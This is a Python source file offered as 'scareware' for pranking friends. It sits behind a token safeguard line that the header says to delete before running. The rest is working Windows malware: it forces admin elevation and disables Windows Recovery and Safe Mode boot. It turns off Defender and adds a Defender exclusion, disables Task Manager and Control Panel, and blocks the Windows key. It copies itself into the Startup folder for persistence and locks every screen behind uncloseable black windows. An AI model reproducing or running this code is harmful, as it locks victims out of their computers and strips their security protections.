from ctypes import wintypes
import tkinter as tk
import winreg
import ctypes
import sys
import os
import shutil
import subprocess
import keyboard

##############################################################

SAFEGUARD
&&&&&&&&&

WARNING: this _is a scareware designed to scare the life out of your friends
DO NOT run unless you have explicit permisions _from your friend
to run, remove this message, _and the safeguard above

##############################################################

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

def on_close():
    pass

subprocess.run("reagentc.exe /disable", shell=True)

startup_folder = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
cmd = ["powershell.exe", f"Add-MpPreference -ExclusionPath '{startup_folder}'"]
subprocess.run(cmd, capture_output=True, text=True)

result = subprocess.run(cmd, capture_output=True, text=True)

keyboard.block_key('windows')
keyboard.block_key('left windows')
keyboard.block_key('right windows')

result = subprocess.run(["bcdedit", "/deletevalue", "{current}", "safeboot"], capture_output=True, text=True, check=True)

current_path = os.path.abspath(__file__)
startup_folder = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
new_path = os.path.join(startup_folder, os.path.basename(__file__))
shutil.copy(current_path, new_path)
subprocess.Popen(['python', new_path])

key_path = r"SOFTWARE\Policies\Microsoft\Windows Defender"
key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
winreg.CloseKey(key)

key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
winreg.CloseKey(key)

key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
winreg.SetValueEx(key, "NoControlPanel", 0, winreg.REG_DWORD, 1)
winreg.CloseKey(key)

user32 = ctypes.windll.user32

MONITORINFOF_PRIMARY = 1

MonitorEnumProc = ctypes.WINFUNCTYPE(
    wintypes.BOOL,
    wintypes.HMONITOR,
    wintypes.HDC,
    ctypes.POINTER(wintypes.RECT),
    wintypes.LPARAM
)

monitors = []

def _monitor_enum_proc(hMonitor, hdcMonitor, lprcMonitor, dwData):
    r = lprcMonitor.contents
    mi = wintypes.RECT()
    class MONITORINFO(ctypes.Structure):
        _fields_ = [
            ("cbSize", wintypes.DWORD),
            ("rcMonitor", wintypes.RECT),
            ("rcWork", wintypes.RECT),
            ("dwFlags", wintypes.DWORD),
        ]
    info = MONITORINFO()
    info.cbSize = ctypes.sizeof(MONITORINFO)
    user32.GetMonitorInfoW(hMonitor, ctypes.byref(info))
    rect = info.rcMonitor
    is_primary = bool(info.dwFlags & MONITORINFOF_PRIMARY)
    monitors.append((rect.left, rect.top, rect.right, rect.bottom, is_primary))
    return True

user32.EnumDisplayMonitors(0, 0, MonitorEnumProc(_monitor_enum_proc), 0)

root = tk.Tk()
root.withdraw()

for left, top, right, bottom, is_primary in monitors:
    w = right - left
    h = bottom - top
    win = tk.Toplevel(root)
    win.geometry(f"{w}x{h}+{left}+{top}")
    win.attributes("-fullscreen", True)
    win.attributes("-topmost", True)
    win.configure(bg="black", cursor="none")
    win.overrideredirect(True)

    if is_primary:
        label = tk.Label(win, text="Try to escape!", fg="white", bg="black", font=("Arial", 48, "bold"), justify="center")
        label.pack(expand=True)

root.protocol("WM_DELETE_WINDOW", on_close)

root.mainloop()
